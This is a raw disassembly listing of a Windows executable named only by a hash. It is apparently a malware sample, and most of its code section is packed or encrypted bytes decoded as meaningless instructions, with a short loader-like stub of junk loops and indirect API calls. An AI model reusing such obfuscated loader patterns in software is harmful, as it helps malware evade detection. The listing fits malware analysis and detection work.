
e8a677462bcb879cebe378106bad886aad3bfb0be3003df18d768c289ca99fd8.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	sbb    eax,0x7e5668d1
  401019:	jle    0x401099
  40101b:	jle    0x400f9f
  40101d:	jno    0x40109d
  40101f:	jle    0x400fef
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xccddcfdb
  401029:	ja     0x401033
  40102b:	or     ecx,DWORD PTR [esi]
  40102d:	jecxz  0x40103b
  40102f:	(bad)  
  401031:	bswap  esp
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc0
  4010c7:	test   al,0x64
  4010c9:	xchg   esp,eax
  4010ca:	jbe    0x4010f8
  4010cc:	xchg   edx,eax
  4010cd:	mov    ebp,0x98a08749
  4010d2:	mov    edx,0x67eec708
  4010d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4010d8:	jg     0x4010e5
  4010da:	mov    ebx,0x48d70604
  4010df:	cdq    
  4010e0:	inc    esp
  4010e1:	cmovl  edi,DWORD PTR [eax+0x4e2d8162]
  4010e8:	mov    bl,0xaa
  4010ea:	dec    esp
  4010eb:	in     al,0x9f
  4010ed:	mov    eax,0x7268ff3b
  4010f2:	adc    edi,edx
  4010f4:	sub    DWORD PTR [edi+0x48],edx
  4010f7:	loopne 0x4010bc
  4010f9:	dec    ebp
  4010fa:	mov    ch,0x37
  4010fc:	jbe    0x4010d8
  4010fe:	(bad)  
  4010ff:	out    dx,al
  401100:	cmp    eax,DWORD PTR [edx+0x7c]
  401103:	add    DWORD PTR [edi-0x3c6605b3],ebx
  401109:	adc    al,0xcf
  40110b:	rcr    edx,0x16
  40110e:	mov    eax,0x79373dc8
  401113:	xor    eax,0x1a28802c
  401118:	mov    ebx,0x647887a
  40111d:	and    al,0x2b
  40111f:	fs test al,0xce
  401122:	(bad)  
  401123:	out    dx,al
  401124:	lds    esi,FWORD PTR [ebx]
  401126:	leave  
  401127:	adc    eax,0x955f75de
  40112c:	shl    BYTE PTR [ebx-0x5a],1
  40112f:	jge    0x4011b0
  401131:	cmp    al,0xd8
  401133:	retf   
  401134:	fs fwait
  401136:	(bad)  
  401137:	sbb    DWORD PTR [ecx-0x853210c],ecx
  40113d:	imul   ebx,DWORD PTR [ecx],0xffffffc8
  401140:	les    ebx,FWORD PTR [ecx+0x2b]
  401143:	not    DWORD PTR [ecx]
  401145:	jb     0x4010d0
  401147:	or     BYTE PTR [esi+0x16],0x89
  40114b:	loop   0x4011ab
  40114d:	mov    ch,0x6b
  40114f:	test   bh,0xf6
  401152:	dec    edi
  401153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401154:	out    dx,al
  401155:	push   0x1f29a188
  40115a:	(bad)  
  40115b:	fcmovbe st,st(2)
  40115d:	es pop ebx
  40115f:	inc    esp
  401160:	sahf   
  401161:	les    ecx,FWORD PTR [ebx-0x54]
  401164:	ficomp WORD PTR [esi+0x53]
  401167:	mov    ecx,0x8100f67d
  40116c:	or     ebx,DWORD PTR [esi+0x59]
  40116f:	or     al,0x47
  401171:	stc    
  401172:	loopne 0x4011ea
  401174:	jg     0x401199
  401176:	cs jne 0x40110e
  401179:	mov    esi,0x18d20ba3
  40117e:	outs   dx,BYTE PTR ds:[esi]
  40117f:	fidivr WORD PTR [ecx+0x69]
  401182:	jge    0x401132
  401184:	fisubr WORD PTR [ebx+0x5c1037c5]
  40118a:	adc    eax,0xa15229e1
  40118f:	and    DWORD PTR [ebx-0x273e833f],0xac15f89e
  401199:	cmc    
  40119a:	xchg   BYTE PTR [ecx],bh
  40119c:	adc    al,0xc2
  40119e:	xchg   ebx,eax
  40119f:	cdq    
  4011a0:	jmp    0x6680:0x143e6778
  4011a7:	fwait
  4011a8:	in     al,dx
  4011a9:	outs   dx,DWORD PTR ds:[esi]
  4011aa:	pushf  
  4011ab:	arpl   WORD PTR [edi+0x69a659a6],bp
  4011b1:	adc    DWORD PTR [ebp+0x5c6092be],0xffffffe6
  4011b8:	into   
  4011b9:	cld    
  4011ba:	arpl   WORD PTR [ecx+0x3097b52],bx
  4011c0:	sub    eax,0x33c04f34
  4011c5:	push   ds
  4011c6:	mov    al,ds:0x877d5931
  4011cb:	nop
  4011cc:	mov    al,ds:0xc72d0f27
  4011d1:	push   cs
  4011d2:	jo     0x4011a7
  4011d4:	add    esi,edi
  4011d6:	adc    BYTE PTR [edx-0x3d62eb66],al
  4011dc:	mov    dh,0x7
  4011de:	popa   
  4011df:	cmp    eax,0x8db68181
  4011e4:	hlt    
  4011e5:	add    DWORD PTR [edx+0x60],esi
  4011e8:	in     eax,0x71
  4011ea:	test   eax,0xe305def0
  4011ef:	push   edx
  4011f0:	mov    al,ds:0xbbd19036
  4011f5:	dec    edi
  4011f6:	mov    esp,0xaf6a6fcf
  4011fb:	jnp    0x4011ec
  4011fd:	jp     0x401212
  4011ff:	jge    0x4011c7
  401201:	cmp    bh,dh
  401203:	and    BYTE PTR [edx-0x7ef22dfc],ch
  401209:	cwde   
  40120a:	lahf   
  40120b:	mov    dl,0x5e
  40120d:	dec    ebx
  40120e:	scas   al,BYTE PTR es:[edi]
  40120f:	jo     0x401249
  401211:	push   0xf3f98c3c
  401216:	hlt    
  401217:	and    al,0xfc
  401219:	inc    BYTE PTR [edx+0x5ce078ac]
  40121f:	jge    0x4011b4
  401221:	dec    edi
  401222:	xchg   esi,eax
  401223:	sub    eax,0xef0b1243
  401228:	in     al,0xe3
  40122a:	retf   0xa58b
  40122d:	or     DWORD PTR [esi],edi
  40122f:	(bad)  
  401230:	std    
  401231:	cmp    eax,DWORD PTR [esi]
  401233:	add    esi,ebx
  401235:	adc    cl,BYTE PTR [edx-0x2c581e91]
  40123b:	add    ah,BYTE PTR [esi]
  40123d:	push   ebp
  40123e:	ror    DWORD PTR [edi],0xa4
  401241:	dec    edi
  401242:	test   DWORD PTR ds:0x37274d36,edi
  401248:	les    esp,FWORD PTR [eax]
  40124a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40124b:	pop    ecx
  40124c:	pushf  
  40124d:	es sbb esp,ebx
  401250:	push   ebx
  401251:	adc    bl,al
  401253:	shl    BYTE PTR [eax-0x16],0xf3
  401257:	out    0xa6,al
  401259:	je     0x401271
  40125b:	mov    eax,0xd3d1006b
  401260:	jmp    0xeb3e14fe
  401265:	and    al,0xa4
  401267:	mov    dl,0x20
  401269:	xchg   esi,ebp
  40126b:	js     0x4011f6
  40126d:	pop    ebx
  40126e:	xor    DWORD PTR [edi+0x4a],edx
  401271:	fld    st(5)
  401273:	outs   dx,BYTE PTR ds:[esi]
  401274:	xchg   ecx,eax
  401275:	loop   0x401273
  401277:	mov    ds:0x7412aa76,eax
  40127c:	out    0x61,al
  40127e:	mov    ecx,0x91e10c2b
  401283:	jge    0x40123e
  401285:	mov    ebp,0xbb433cec
  40128a:	mov    ah,0x2e
  40128c:	pop    esi
  40128d:	into   
  40128e:	jmp    0x2da1:0x53a4840
  401295:	jnp    0x4012a1
  401297:	push   es
  401298:	ins    DWORD PTR es:[edi],dx
  401299:	xchg   BYTE PTR [ecx],bh
  40129b:	leave  
  40129c:	loopne 0x4012c6
  40129e:	retf   0xff76
  4012a1:	mov    WORD PTR [ebp+0x6b],ds
  4012a4:	push   edx
  4012a5:	or     cl,BYTE PTR [ebx-0x50b9fca3]
  4012ab:	lds    edi,FWORD PTR [ebp-0x3b5624f8]
  4012b1:	and    cl,cl
  4012b3:	frstor [edx+edi*1]
  4012b6:	int    0x87
  4012b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012b9:	pop    ebp
  4012ba:	pop    ss
  4012bb:	outs   dx,DWORD PTR ds:[esi]
  4012bc:	mov    bh,0xcc
  4012be:	out    0xa0,eax
  4012c0:	aaa    
  4012c1:	xchg   esi,eax
  4012c2:	push   ss
  4012c3:	stos   DWORD PTR es:[edi],eax
  4012c4:	out    dx,eax
  4012c5:	gs inc esp
  4012c7:	rol    esi,cl
  4012c9:	outs   dx,BYTE PTR ds:[esi]
  4012ca:	repz iret 
  4012cc:	aam    0x26
  4012ce:	int3   
  4012cf:	mov    ds:0xfd0a5ba,al
  4012d4:	inc    ebx
  4012d5:	shr    BYTE PTR [ecx+ebp*4+0x6],0xd2
  4012da:	push   ecx
  4012db:	iret   
  4012dc:	or     eax,0x1b8bd09a
  4012e1:	aam    0x37
  4012e3:	mov    bh,0x16
  4012e5:	sub    edi,edi
  4012e7:	sub    esp,DWORD PTR [edi+ebp*4-0x7270ed7c]
  4012ee:	sbb    BYTE PTR [ecx],ch
  4012f0:	cwde   
  4012f1:	pushf  
  4012f2:	xchg   DWORD PTR [ecx],esp
  4012f4:	xchg   DWORD PTR [ecx-0x54],esi
  4012f7:	dec    esp
  4012f8:	enter  0xa383,0x10
  4012fc:	jns    0x40135e
  4012fe:	loop   0x401363
  401300:	and    cl,BYTE PTR [edx]
  401302:	fdivr  st(5),st
  401304:	mov    WORD PTR [edx+0x761d9c42],?
  40130a:	mov    cl,0x84
  40130c:	dec    ebp
  40130d:	nop
  40130e:	inc    edx
  40130f:	fwait
  401310:	xor    al,0x38
  401312:	xor    bh,BYTE PTR cs:[edx-0x352fc1c8]
  401319:	adc    BYTE PTR [edx+0x300e9323],dh
  40131f:	test   BYTE PTR ds:0x2de3e110,ch
  401325:	mov    ch,0x7
  401327:	and    al,0x4
  401329:	(bad)  
  40132a:	call   FWORD PTR [ecx-0x1371ed9f]
  401330:	xchg   BYTE PTR [ecx+eiz*1+0x3e],ah
  401334:	cmp    BYTE PTR [edx+esi*4-0x2e],ah
  401338:	mov    edx,0x28010623
  40133d:	dec    ebx
  40133e:	mov    esp,0xc336ec74
  401343:	adc    eax,0x9e7c45b9
  401348:	loop   0x4013a1
  40134a:	aam    0xaa
  40134c:	cmp    eax,0xaa8fd110
  401351:	or     BYTE PTR [ecx-0x3d],ah
  401354:	addr16 mov ds:0x39c1,eax
  401358:	lock sub eax,0x41878af4
  40135e:	jnp    0x401303
  401360:	sub    ecx,DWORD PTR [edi-0x2eca3d7a]
  401366:	inc    esi
  401367:	adc    al,0x1f
  401369:	push   cs
  40136a:	ss push esi
  40136c:	push   cs
  40136d:	call   0xe9868bb1
  401372:	in     eax,dx
  401373:	out    dx,al
  401374:	or     BYTE PTR [edi],0x8d
  401377:	add    al,0x31
  401379:	sub    BYTE PTR [eax-0x66dd1a89],ah
  40137f:	push   ss
  401380:	xor    al,0x5f
  401382:	loop   0x40138d
  401384:	xchg   ebx,eax
  401385:	jl     0x401363
  401387:	and    BYTE PTR [esi],dh
  401389:	rcr    BYTE PTR [edi-0x1e],0x8a
  40138d:	adc    eax,0x3625323a
  401392:	xchg   esp,eax
  401393:	loop   0x40140c
  401395:	and    dl,BYTE PTR [ecx+0x1]
  401398:	add    dl,bh
  40139a:	cmp    al,0x92
  40139c:	cwde   
  40139d:	dec    ebp
  40139e:	leave  
  40139f:	jb     0x401419
  4013a1:	mov    dl,0xd6
  4013a3:	sysret 
  4013a5:	ja     0x4013d3
  4013a7:	adc    BYTE PTR [eax+edx*4],0x8a
  4013ab:	jne    0x40136b
  4013ad:	sub    ebp,eax
  4013af:	adc    eax,0x5d766d70
  4013b4:	sub    esp,0x2c
  4013b7:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  4013be:	sbb    DWORD PTR ds:0x430486,edi
  4013c4:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  4013cb:	sub    ecx,eax
  4013cd:	mov    eax,0x9507
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42ee20,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42ee20,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42ee20,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42e9ec
  401403:	mov    ecx,DWORD PTR ds:0x42ee20
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42ee20,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42ee24
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x430556,0x15
  401428:	cmp    DWORD PTR ds:0x430556,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x430556,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e7e5
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42e9f0
  40145f:	cmp    DWORD PTR ds:0x430556,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x430556
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x430556,ecx
  401479:	mov    ecx,DWORD PTR ds:0x430556
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x430556,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43049a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0x9e50:0xc48b26e
  4014ab:	add    BYTE PTR [eax+0x7e7182ad],0x7e
  4014b2:	xor    BYTE PTR [ecx+0x7e],0x7e
  4014b6:	int    0xae
  4014b8:	cmp    eax,0xc4adcc86
  4014bd:	fiadd  DWORD PTR [eax-0x4820eeda]
  4014c3:	sbb    esi,DWORD PTR [eax+0x60]
  4014c6:	call   0x246a:0xb181ba1f
  4014cd:	push   ss
  4014ce:	xchg   esp,eax
  4014cf:	cmp    ecx,esp
  4014d1:	(bad)  
  4014d2:	fist   WORD PTR [ebx+0xf]
  4014d5:	pop    ebp
  4014d6:	push   edi
  4014d7:	pop    ecx
  4014d8:	popa   
  4014d9:	add    DWORD PTR [ebx+eiz*2-0x46090429],edx
  4014e0:	fld    st(6)
  4014e2:	cwde   
  4014e3:	rol    bl,1
  4014e5:	fsub   st,st(5)
  4014e7:	(bad)  
  4014e8:	mov    ecx,0x70d57b66
  4014ed:	hlt    
  4014ee:	push   edi
  4014ef:	mov    edi,gs
  4014f1:	mov    bl,0x50
  4014f3:	loopne 0x40153d
  4014f5:	ror    DWORD PTR [edi],0xa6
  4014f8:	and    eax,0x4ee19aa7
  4014fd:	sbb    al,0x99
  4014ff:	leave  
  401500:	ins    BYTE PTR es:[edi],dx
  401501:	ror    BYTE PTR [ecx-0x50],cl
  401504:	inc    esi
  401505:	fwait
  401506:	inc    eax
  401508:	xor    BYTE PTR [edi],0x85
  40150b:	cld    
  40150c:	xor    DWORD PTR [edi-0x1],0xd84f7be6
  401513:	jmp    0x4014d4
  401515:	les    ebp,FWORD PTR [ebp-0x3f]
  401518:	popa   
  401519:	and    DWORD PTR [ebp-0x6e],0xf840d99f
  401520:	sub    ch,dl
  401522:	inc    ebx
  401523:	sbb    DWORD PTR [ecx+ebp*8+0x25ea8742],0x1e8a0444
  40152e:	push   esi
  40152f:	xor    eax,0x55c405be
  401534:	fstp   DWORD PTR gs:[edx]
  401537:	jae    0x401555
  401539:	sahf   
  40153a:	jo     0x4015a0
  40153c:	or     ebp,DWORD PTR ds:0x62e63b26
  401542:	dec    esp
  401543:	sar    DWORD PTR [esi+0x18],cl
  401546:	pop    ebx
  401547:	mov    cl,BYTE PTR [eax]
  401549:	imul   ebx,DWORD PTR [edi],0xfffffff0
  40154c:	dec    edx
  40154d:	cwde   
  40154e:	adc    esi,DWORD PTR [edx+0x7d475c9]
  401554:	xor    DWORD PTR [ecx],0x7e54110e
  40155a:	call   0xab3b03ac
  40155f:	pop    ebp
  401560:	imul   ebp,DWORD PTR gs:0x802b865d,0x230c794a
  40156b:	mov    al,ds:0x1f7eb36
  401570:	and    al,0x56
  401572:	push   ebx
  401573:	imul   esp,DWORD PTR [ebx-0x5f79ca92],0x36
  40157a:	and    DWORD PTR [ecx+0x5f5c07c3],ebx
  401580:	idiv   BYTE PTR [edx]
  401582:	xor    bl,dh
  401584:	(bad)  
  401586:	rcl    DWORD PTR [esi],0x55
  401589:	loop   0x4015d0
  40158b:	jne    0x40151a
  40158d:	(bad)  
  40158e:	(bad)  
  40158f:	push   0xee58d7fe
  401594:	ins    BYTE PTR es:[edi],dx
  401595:	jae    0x40155b
  401597:	sbb    BYTE PTR [edx],dh
  401599:	or     DWORD PTR [ebx],edx
  40159b:	jg     0x401583
  40159d:	test   eax,0xbaa7adad
  4015a2:	leave  
  4015a3:	mov    bh,0xcc
  4015a5:	shr    cl,1
  4015a7:	or     BYTE PTR [edx],0x2a
  4015aa:	lahf   
  4015ab:	xchg   ecx,eax
  4015ac:	dec    ebp
  4015ad:	out    0x54,eax
  4015af:	jmp    0xec5f:0x94193f3
  4015b6:	pushf  
  4015b7:	inc    ecx
  4015b8:	es xor ecx,ecx
  4015bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015bc:	push   0x4da12305
  4015c1:	inc    edi
  4015c2:	aas    
  4015c3:	push   cs
  4015c4:	test   BYTE PTR fs:[eax*1-0x3dc96c2f],al
  4015cc:	leave  
  4015cd:	(bad)  
  4015ce:	in     al,dx
  4015cf:	sahf   
  4015d0:	je     0x401586
  4015d2:	cmp    BYTE PTR [esi-0x28],ch
  4015d5:	jno    0x40157f
  4015d7:	mov    BYTE PTR [esi+edi*1-0x6b],dh
  4015db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015dc:	dec    edx
  4015dd:	sbb    ch,BYTE PTR [ebx-0x39bc024f]
  4015e3:	xlat   BYTE PTR ds:[ebx]
  4015e4:	icebp  
  4015e5:	mov    bh,0xb6
  4015e7:	mov    al,ds:0xe4741186
  4015ec:	stos   BYTE PTR es:[edi],al
  4015ed:	imul   edi,ecx,0x9d55f45e
  4015f3:	daa    
  4015f4:	sub    edx,ebp
  4015f6:	sbb    edi,eax
  4015f8:	jmp    0x7db30744
  4015fd:	dec    sp
  4015ff:	cwde   
  401600:	inc    ebx
  401601:	mov    DWORD PTR [edi-0x1b],ecx
  401604:	pop    ebx
  401605:	ins    BYTE PTR es:[edi],dx
  401606:	rol    ah,1
  401608:	addr16 push eax
  40160a:	cmp    BYTE PTR [ecx-0x56],0xe5
  40160e:	dec    edi
  40160f:	ror    DWORD PTR [ebp-0x27],1
  401612:	(bad)  
  401613:	retf   0x3506
  401616:	dec    ecx
  401617:	or     ebp,DWORD PTR [ebx]
  401619:	mov    WORD PTR [edx+eax*4+0x60],?
  40161d:	out    dx,al
  40161e:	or     edx,DWORD PTR [edx]
  401620:	stos   DWORD PTR es:[edi],eax
  401621:	xor    BYTE PTR [eax-0x7075304b],cl
  401627:	int3   
  401628:	fistp  DWORD PTR [ebx-0x1e]
  40162b:	cmp    al,0xca
  40162d:	adc    esi,edi
  40162f:	or     al,0xec
  401631:	adc    al,0x74
  401633:	mov    al,ds:0x2e829cd1
  401638:	xor    BYTE PTR [edx-0x53a74c30],0x30
  40163f:	xor    cl,BYTE PTR [ebx+0x532586ad]
  401645:	xor    al,0xf
  401647:	cdq    
  401648:	bswap  ebp
  40164a:	jnp    0x40161c
  40164c:	mov    ebp,0x97549b21
  401651:	fidiv  DWORD PTR [eax+eax*2+0x34b08685]
  401658:	(bad)  
  401659:	int    0x35
  40165b:	test   al,0x1a
  40165d:	out    dx,al
  40165e:	(bad)  
  40165f:	sti    
  401660:	daa    
  401661:	add    esp,edx
  401663:	mov    edi,0xb92c53ec
  401668:	fst    DWORD PTR [ecx+0x72]
  40166b:	push   ebx
  40166c:	cmp    ebx,DWORD PTR [edx+eiz*1]
  40166f:	fs xchg edi,eax
  401671:	xchg   esi,eax
  401672:	stos   BYTE PTR es:[edi],al
  401673:	xlat   BYTE PTR ds:[ebx]
  401674:	scas   al,BYTE PTR es:[edi]
  401675:	sub    DWORD PTR [ebp-0x1],eax
  401678:	ret    0x1ebb
  40167b:	push   eax
  40167c:	dec    esp
  40167d:	xchg   BYTE PTR [ebp-0x48],cl
  401680:	test   BYTE PTR [esi],bl
  401682:	cwde   
  401683:	adc    al,BYTE PTR [edi]
  401685:	mov    ebx,ebp
  401687:	adc    dl,BYTE PTR [eax-0x452e15ef]
  40168d:	mov    ebp,0x293aaad0
  401692:	int3   
  401693:	adc    esp,esp
  401695:	jmp    0x401659
  401697:	xchg   esp,eax
  401698:	mov    ds:0x1203284b,al
  40169d:	retf   0xe519
  4016a0:	mov    cl,0xc5
  4016a2:	ins    BYTE PTR es:[edi],dx
  4016a3:	pop    ecx
  4016a4:	xor    eax,0xaacfa1b9
  4016a9:	iret   
  4016aa:	test   al,0x92
  4016ac:	loop   0x4016e6
  4016ae:	xchg   edi,eax
  4016af:	and    DWORD PTR [esi+0x4e532df8],0xffffffe3
  4016b6:	sub    BYTE PTR [esi],bh
  4016b8:	pushf  
  4016b9:	daa    
  4016ba:	ja     0x4016b8
  4016bc:	cmp    DWORD PTR [eax+0x43],0x13
  4016c0:	jns    0x401707
  4016c2:	xchg   DWORD PTR [edx],eax
  4016c4:	add    ecx,DWORD PTR [ebp-0x22]
  4016c7:	lods   eax,DWORD PTR ds:[esi]
  4016c8:	(bad)  
  4016c9:	mov    bh,0x6c
  4016cb:	sub    dl,BYTE PTR [ebp+0x79fa602]
  4016d1:	and    al,0xab
  4016d3:	mov    al,BYTE PTR [eax]
  4016d5:	xor    DWORD PTR fs:[esi-0x3ed87023],esi
  4016dc:	xor    al,0xe9
  4016de:	loop   0x401741
  4016e0:	cmp    bl,BYTE PTR [edi-0x29]
  4016e3:	retf   0x33f4
  4016e6:	das    
  4016e7:	test   BYTE PTR [edi-0x2d],bl
  4016ea:	sub    ch,BYTE PTR [ecx]
  4016ec:	mov    dh,0x36
  4016ee:	add    BYTE PTR [ebx],ah
  4016f0:	aaa    
  4016f1:	xor    al,bh
  4016f3:	cwde   
  4016f4:	das    
  4016f5:	cmc    
  4016f6:	and    BYTE PTR [edi],dl
  4016f8:	xor    al,0xe6
  4016fa:	shl    al,cl
  4016fc:	outs   dx,DWORD PTR ds:[esi]
  4016fd:	inc    eax
  4016fe:	gs scas eax,DWORD PTR es:[edi]
  401700:	xchg   ebx,eax
  401701:	ret    0xd17b
  401704:	inc    esp
  401705:	mov    dl,ch
  401707:	dec    ecx
  401708:	xor    esp,DWORD PTR ds:0x6a35e9c
  40170e:	scas   al,BYTE PTR es:[edi]
  40170f:	adc    BYTE PTR [ebx-0x565673d5],ch
  401715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401716:	mov    al,ds:0x993b65ff
  40171b:	popa   
  40171c:	pushf  
  40171d:	rcl    edx,cl
  40171f:	adc    eax,0xae3da56c
  401724:	xor    BYTE PTR [ebx*4+0xe89ec8],0xc5
  40172c:	dec    esi
  40172d:	lea    ebx,[ecx-0xb61d15a]
  401733:	pop    eax
  401734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401735:	lods   al,BYTE PTR ds:[esi]
  401736:	pop    eax
  401737:	jae    0x4016e3
  401739:	adc    eax,0xa14cc82e
  40173e:	push   0x42
  401740:	pop    eax
  401741:	pop    ss
  401742:	(bad)  
  401743:	sahf   
  401744:	faddp  st(1),st
  401746:	xchg   ebx,eax
  401747:	lahf   
  401748:	int3   
  401749:	lea    edx,[ebx]
  40174b:	mov    al,BYTE PTR [edx+0x741ee18e]
  401751:	push   cs
  401752:	xor    dh,BYTE PTR [ebx-0x49]
  401755:	mov    bh,BYTE PTR [edx+0x65711c4a]
  40175b:	les    edx,FWORD PTR cs:[ebp-0x2]
  40175f:	jnp    0x401739
  401761:	push   0x27
  401763:	mov    esi,DWORD PTR [ebx+0x6e88b175]
  401769:	aas    
  40176a:	nop
  40176b:	mov    ah,BYTE PTR [ecx]
  40176d:	cmp    ecx,edi
  40176f:	add    bh,BYTE PTR [ebp+0x37a57ecc]
  401775:	mov    edi,0x5ef780ef
  40177a:	push   edi
  40177b:	stc    
  40177c:	or     al,0x7f
  40177e:	sbb    ch,BYTE PTR [ebx+0x74]
  401781:	adc    bl,cl
  401783:	shl    BYTE PTR [ecx+0x40fe9009],1
  401789:	xchg   dh,bl
  40178b:	rcl    BYTE PTR [ecx+0x6737b05e],0xf2
  401792:	sbb    BYTE PTR [edi],ch
  401794:	stc    
  401795:	and    eax,0x8e138316
  40179a:	add    al,0x77
  40179c:	frstor [ecx+esi*2-0x31]
  4017a0:	mov    edi,0xa730b472
  4017a5:	loop   0x4017c3
  4017a7:	pop    es
  4017a8:	jbe    0x4017ff
  4017aa:	(bad)  
  4017ab:	mov    eax,ds:0x3738099a
  4017b0:	fcmovbe st,st(1)
  4017b2:	test   al,0x67
  4017b4:	jle    0x4017bb
  4017b6:	sbb    ebp,DWORD PTR [ecx+0x3a097b6e]
  4017bc:	ret    0xc2b9
  4017bf:	dec    esi
  4017c0:	and    al,0x7c
  4017c2:	mov    WORD PTR [edi-0x2a],ss
  4017c5:	xor    eax,0x6e8d5efa
  4017ca:	jecxz  0x4017fe
  4017cc:	sti    
  4017cd:	mov    ah,0x2a
  4017cf:	std    
  4017d0:	int    0x4
  4017d2:	iret   
  4017d3:	jecxz  0x401832
  4017d5:	push   esi
  4017d6:	ret    0x3bfd
  4017d9:	retf   0xbb55
  4017dc:	dec    ecx
  4017dd:	inc    edi
  4017de:	mov    DWORD PTR [ecx+ebp*4-0x71],esp
  4017e2:	pop    esi
  4017e3:	mov    dh,0x85
  4017e5:	sbb    DWORD PTR ds:0xec755edb,edx
  4017eb:	les    ebx,FWORD PTR [esi+0x46]
  4017ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017ef:	or     esp,ebx
  4017f1:	test   dh,0x7d
  4017f4:	outs   dx,BYTE PTR ds:[esi]
  4017f5:	jmp    0x401843
  4017f7:	sub    DWORD PTR [ebx+esi*4+0x19886554],ebx
  4017fe:	pop    ebp
  4017ff:	xchg   BYTE PTR [esp+esi*4+0x74],cl
  401803:	test   eax,0xb5a466b0
  401808:	leave  
  401809:	inc    edx
  40180a:	fnstenv [ebx]
  40180c:	push   esi
  40180d:	rcr    BYTE PTR [edx],0x24
  401810:	(bad)  
  401811:	xlat   BYTE PTR ds:[ebx]
  401812:	enter  0x3166,0xdf
  401816:	or     DWORD PTR [ebx+0x39],esi
  401819:	lock mov al,ds:0x4025af05
  40181f:	lahf   
  401820:	xor    ebx,DWORD PTR [edi]
  401822:	lock xchg ecx,eax
  401824:	ins    BYTE PTR es:[edi],dx
  401825:	inc    edi
  401826:	test   DWORD PTR [edx+0x74],ebp
  401829:	xchg   esp,eax
  40182a:	adc    eax,0xee8fe5b6
  40182f:	dec    eax
  401830:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401831:	cmc    
  401832:	xor    al,0x33
  401834:	fiadd  WORD PTR [ebp+0x782ee66e]
  40183a:	cmp    al,BYTE PTR [edi+0x1ec9aa1c]
  401840:	jecxz  0x4017db
  401842:	mov    ah,BYTE PTR [ebx]
  401844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401845:	adc    BYTE PTR [ecx+ebp*8+0x458996fd],bl
  40184c:	loopne 0x401845
  40184e:	sbb    eax,0x430496
  401853:	push   ebx
  401854:	lea    eax,[ebp-0x18]
  401857:	xor    DWORD PTR ds:0x42e762,ebx
